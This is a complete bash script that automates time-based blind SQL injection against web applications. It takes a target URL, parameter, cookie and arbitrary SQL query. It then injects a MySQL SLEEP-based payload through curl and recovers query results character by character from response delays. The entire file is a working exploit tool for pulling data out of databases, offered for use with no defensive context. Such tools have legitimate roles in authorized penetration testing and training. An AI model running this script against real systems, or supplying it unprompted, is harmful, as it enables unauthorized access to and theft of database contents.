#!/bin/bash

help()
{
	echo "usage: ./time_blind_sqli.sh [-h] -u url [-d data] -p parameter [-c cookie] -s sql -t time_delay" 
	echo
	echo "Options:"
	echo "-h    Print this help"
	echo "-u    URL"
	echo "-d    POST data"
	echo "-p    Vulnerable parameter"
	echo "-c    Cookie"
	echo "-s    SQL query to be executed on target"
	echo "-t    Time delay duration in seconds (try higher value if you get inaccurate results)"

}

while getopts :hu:d:p:c:s:t: option
do
        case "${option}" in
                h) help
                   exit 0;;
		u) url=$OPTARG;;
		d) data=$OPTARG;;
		p) parameter=$OPTARG;;
		c) cookie=$OPTARG;;
		s) sql=$OPTARG;;
		t) t=$OPTARG;;
                \?) help
                    exit 1;;
                :) echo "Invalid option: $OPTARG requires an argument"
                   exit 1;;
        esac
done

if [[ -z "$url" || -z $parameter || -z "$sql" || -z $t ]]
then
	help
	exit 1
fi

if [[ -z "$data" && "$url" != *"$parameter=PAYLOAD"* ]]
then
	>&2 echo "Error: either specified parameter does not exist or payload insertion point not correctly set using PAYLOAD keyword"
	exit 1

elif [[ ! -z "$data" && "$data" != *"$parameter=PAYLOAD"* ]]
then
	>&2 echo "Error: either specified parameter does not exist or payload insertion point not correctly set using PAYLOAD keyword"
	exit 1
fi

if [[ ! -z $t && ! $t =~ ^[0-9]+$ ]]
then 
	>&2 echo "Error: time delay duration must be an integer"
	exit 1
fi

echo "Retrieving query results one character at a time..."

while true
do
	((i++))
	flag=false

	for c in {32..127}
	do

		SECONDS=0

		# Modify this line to adapt payload for other DBMSs
		payload="' OR (SELECT IF((ASCII(SUBSTRING(($sql),$i,1)))=$c,SLEEP($t),0))-- -"	

		# URL encode payload
		payload=$(python3 -c "import urllib.parse; print(urllib.parse.quote(\"$payload\"))")

		if [ ! -z "$data" ]
		then
			# Insert $payload into POST data parameter value
			data2=$(echo "$data" | sed -e "s/PAYLOAD/$payload/")

			if [ ! -z "$cookie" ]
			then
				curl -s -k -X POST -d "$data2" --cookie "$cookie" "$url" > /dev/null
			else
				curl -s -k -X POST -d "$data2" "$url" > /dev/null
			fi

		else
			# Insert $payload into URL query string parameter value
			url2=$(echo "$url" | sed -e "s/PAYLOAD/$payload/")

			if [ ! -z "$cookie" ]
			then
				curl -s -k --cookie "$cookie" "$url2" > /dev/null 
			else
				curl -s -k "$url2" > /dev/null
			fi
		fi

		duration=$SECONDS

		elapsed=$(($duration % 60))

		if [ $elapsed -ge $t ]
		then
			((length++))

			flag=true

			# Convert decimal to ASCII
			str=$(printf \\$(printf '%03o' $c))
			echo -n "$str"
			break
					
		fi

	done

	if [ $flag != true ]
	then
		if [ -z $length ]
		then
			echo "No results"

		else
			echo -e "\nFinished!"
		fi

		exit 0
	fi

done
